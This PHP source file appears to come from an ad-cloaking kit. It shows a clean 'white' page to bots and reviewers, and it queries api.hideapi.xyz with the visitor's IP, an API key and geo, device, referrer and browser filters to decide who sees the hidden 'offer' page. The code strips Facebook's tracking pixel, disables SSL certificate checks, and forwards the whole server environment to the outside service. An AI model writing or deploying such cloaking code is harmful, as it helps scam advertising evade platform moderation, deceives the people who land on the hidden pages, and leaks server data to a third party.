function showWhitePage($white, $method = 'curl', $status = array())
{
    if (substr($white, 0, 8) == 'https://' || substr($white, 0, 7) == 'http://') {
        if (!empty($_GET) && !stristr($method,'privacy')) {
            if (strstr($white, '?')) $white .= '&' . http_build_query($_GET);
            else $white .= '?' . http_build_query($_GET);
        }
        if (strstr($white, '{hc_geo}')) {
            if(!empty($status['geo'])) $white = str_replace('{hc_geo}', $status['geo'], $white);
        } else if (strstr($white, '%7Breq_geo%7D')) {
            if(!empty($status['geo'])) $white = str_replace('%7Bhc_geo%7D', $status['geo'], $white);
        }
        if (strstr($white, '{hc_uid}')) {
            if(!empty($status['uid'])) $white = str_replace('{hc_uid}', $status['uid'], $white);
        } else if (strstr($white, '%7Breq_uid%7D')) {
            if(!empty($status['uid'])) $white = str_replace('%7Bhc_uid%7D', $status['uid'], $white);
        }

        if ($method == '302privacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            header("Location: " . $white);
        } else if ($method == '302') {
            header("Location: " . $white);
        } else {
            if (!function_exists('curl_init')) $page = file_get_contents($white, 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,))));
            else $page = curlRequst($white);
            $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $white . '">', $page, 1);
            $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);
            if (empty($page)) {
                header("HTTP/1.1 503 Service Unavailable", true, 503);
            }
            echo $page;
        }
    } else require_once($white);// bots
    die();
}

function curlRequst($url, $body = '', $returnHeaders = false)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if (!empty($body)) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
    }
    if (!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 45);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $r = @curl_exec($ch);
    curl_close($ch);
    return $r;
}

function inlineEditor($s)
{
    $f = file($_SERVER["SCRIPT_FILENAME"]);
    $r = 0;
    foreach ($f as $n => $l) {
        if (strstr($l, $s)) {
            $r = $n;
            break;
        }
    }
    return $r + 1;
}

function blockDDOS()
{
    $ips = file('dummyDDOS.txt', FILE_IGNORE_NEW_LINES);
    foreach ($ips as $ip) {
        if (!empty($ip)) {
            foreach ($_SERVER as $key => $val) {
                // we can block single IP, or use IP mask if needed.
                if (preg_match("#(^|[^0-9a-f:])$ip#", $val)) {
                    // if IP were used for DDOS, emulate server unavalable error.
                    // warning: it's permanent ban! we will not knowing when ddos is over!
                    header("HTTP/1.1 503 Service Unavailable", true, 503);
                    die();
                }
            }
        }
    }
}

function hashIP()
{
    $ip = '';
    foreach (array('HTTP_CF_CONNECTING_IP', 'CF-Connecting-IP', 'Cf-Connecting-Ip', 'cf-connecting-ip') as $k) {
        if (!empty($_SERVER[$k])) $ip = $_SERVER[$k];
    }
    if (empty($ip)) {
        foreach (array('HTTP_FORWARDED', 'Forwarded', 'forwarded', 'x-real-ip', 'HTTP_X_REAL_IP', 'REMOTE_ADDR') as $k) {
            if (!empty($_SERVER[$k])) $ip .= $_SERVER[$k];
        }
    }
    return crc32($ip);

}

function hashDev()
{
    return hashIP() . crc32($_SERVER['HTTP_USER_AGENT'].$_SERVER["HTTP_HOST"]);
}

function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    if(!$ip) $ip='127.0.0.1';
    $host = gethostbyname('api.hideapi.xyz');
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-1047787274&js=false&stage=';
    if (!empty($HCSET['PASSIVE'])) $url .= '&PASSIVE=' . $HCSET['PASSIVE'];
    if (!empty($HCSET['DEBUG_MODE'])) $url .= '&DEBUG_MODE=' . $HCSET['DEBUG_MODE'];
    if (!empty($HCSET['banReason'])) $url .= '&banReason=' . $HCSET['banReason'];
    if (!empty($HCSET['skipReason'])) $url .= '&skipReason=' . $HCSET['skipReason'];
    if (!empty($HCSET['VERSION'])) $url .= '&version=' . $HCSET['VERSION'];
    if (!empty($HCSET['WHITE_METHOD'])) $url .= '&wmet=' . $HCSET['WHITE_METHOD'];
    if (!empty($HCSET['OFFER_METHOD'])) $url .= '&omet=' . $HCSET['OFFER_METHOD'];
    if (!empty($HCSET['W_CRC'])) $url .= '&wcrc=' . $HCSET['W_CRC'];
    if (!empty($HCSET['O_CRC'])) $url .= '&ocrc=' . $HCSET['O_CRC'];
    if (!empty($HCSET['W_PIXELS'])) $url .= '&W_PIXELS=' . $HCSET['W_PIXELS'];
    if (!empty($HCSET['O_PIXELS'])) $url .= '&O_PIXELS=' . $HCSET['O_PIXELS'];
    if (!empty($HCSET['DISABLE_CACHE'])) $url .= '&cache=' . $HCSET['DISABLE_CACHE'];
    if (!empty($HCSET['mlSet'])) $url .= '&mlSet=' . $HCSET['mlSet'];
    if (!empty($HCSET['WHITE_PAGE'])) $url .= '&white=' . urlencode($HCSET['WHITE_PAGE']);
    if (!empty($HCSET['OFFER_PAGE'])) $url .= '&offer=' . urlencode($HCSET['OFFER_PAGE']);
    if (!empty($HCSET['DELAY_START'])) $url .= '&delay=' . urlencode($HCSET['DELAY_START']);
    if (!empty($HCSET['DELAY_PERMANENT'])) $url .= '&perm=' . urlencode($HCSET['DELAY_PERMANENT']);
    if (!empty($HCSET['DELAY_NONBOT'])) $url .= '&DELAY_NONBOT=' . urlencode($HCSET['DELAY_NONBOT']);
    if (!empty($HCSET['FILTER_GEO_MODE'])) $url .= '&FILTER_GEO_MODE=' . urlencode($HCSET['FILTER_GEO_MODE']);
    if (!empty($HCSET['FILTER_GEO_LIST'])) $url .= '&FILTER_GEO_LIST=' . urlencode($HCSET['FILTER_GEO_LIST']);
    if (!empty($HCSET['FILTER_DEV_MODE'])) $url .= '&FILTER_DEV_MODE=' . urlencode($HCSET['FILTER_DEV_MODE']);
    if (!empty($HCSET['FILTER_DEV_LIST'])) $url .= '&FILTER_DEV_LIST=' . urlencode($HCSET['FILTER_DEV_LIST']);
    if (!empty($HCSET['FILTER_UTM_MODE'])) $url .= '&FILTER_UTM_MODE=' . urlencode($HCSET['FILTER_UTM_MODE']);
    if (!empty($HCSET['FILTER_UTM_LIST'])) $url .= '&FILTER_UTM_LIST=' . urlencode($HCSET['FILTER_UTM_LIST']);
    if (!empty($HCSET['FILTER_REF_MODE'])) $url .= '&FILTER_REF_MODE=' . urlencode($HCSET['FILTER_REF_MODE']);
    if (!empty($HCSET['FILTER_REF_LIST'])) $url .= '&FILTER_REF_LIST=' . urlencode($HCSET['FILTER_REF_LIST']);
    if (!empty($HCSET['FILTER_NOREF'])) $url .= '&FILTER_NOREF=' . urlencode($HCSET['FILTER_NOREF']);
    if (!empty($HCSET['FILTER_NET_MODE'])) $url .= '&FILTER_NET_MODE=' . urlencode($HCSET['FILTER_NET_MODE']);
    if (!empty($HCSET['FILTER_NET_LIST'])) $url .= '&FILTER_NET_LIST=' . urlencode($HCSET['FILTER_NET_LIST']);
    if (!empty($HCSET['FILTER_BRO_MODE'])) $url .= '&FILTER_BRO_MODE=' . urlencode($HCSET['FILTER_BRO_MODE']);
    if (!empty($HCSET['FILTER_BRO_LIST'])) $url .= '&FILTER_BRO_LIST=' . urlencode($HCSET['FILTER_BRO_LIST']);
    if (!empty($HCSET['BLOCK_DDOS'])) $url .= '&BLOCK_DDOS=' . urlencode($HCSET['BLOCK_DDOS']);
    if (!empty($HCSET['USE_SESSIONS'])) $url .= '&USE_SESSIONS=' . urlencode($HCSET['USE_SESSIONS']);

    if (!function_exists('curl_init')) $answer = @file_get_contents($url . '&curl=false', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'protocol_version' => 1.1, 'timeout' => 5, 'header' => "Content-type: application/json\r\nConnection: close\r\n" . "Content-Length: " . strlen($HCSETdata) . "\r\n", 'content' => $HCSETdata))));
    else $answer = @curlRequst($url . '&curl=true', $HCSETdata);
    return $answer;
}

function getHeaders() {
    $headers = array();
//    if (function_exists("getallheaders")) $headers = getallheaders();
//    if (empty($headers)) foreach ($_SERVER as $k => $v) {
//        if (substr($k, 0, 5) == 'HTTP_') $headers[$k] = $v;
//    }
    // todo fix
    $headers = $_SERVER;
    $headers['path'] = $_SERVER["REQUEST_URI"];
    // fix for roadrunner / IIS
    if (empty($headers['path'])) {
        //HTTP_REQUEST_URI || SCRIPT_URL || HTTP_SCRIPT_URI ???
        if (empty($_SERVER['QUERY_STRING']) && !empty($_GET)) $headers['path'] = $_SERVER["SCRIPT_NAME"] . '?' . http_build_query($_GET);
        else $headers['path'] = $_SERVER["SCRIPT_NAME"] . (empty($_SERVER['QUERY_STRING']) ? '' : '?' . $_SERVER['QUERY_STRING']);
    }
    // fix for domain misconfiguration
    // todo:   SERVER_NAME использовать при отсутствии HTTP_HOST...   X-Forwarded-Server
    if(empty($_SERVER['HTTP_HOST'])) {
        if (!empty($_SERVER['HTTP_AUTHORITY'])) $_SERVER['HTTP_HOST'] = $_SERVER['HTTP_AUTHORITY'];
        else if (!empty($_SERVER['HTTP_AUTHORITY'])) $_SERVER['HTTP_HOST'] = $_SERVER['HTTP_AUTHORITY'];
        else if (!empty($_SERVER['SERVER_NAME'])) $_SERVER['HTTP_HOST'] = $_SERVER['SERVER_NAME'];
    }
    $headers['REQUEST_METHOD'] = $_SERVER['REQUEST_METHOD'];
    if ($_SERVER["SERVER_PORT"] == 443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL'])) $headers['HTTP_HTTPS'] = '1';
    return $headers;
}

?>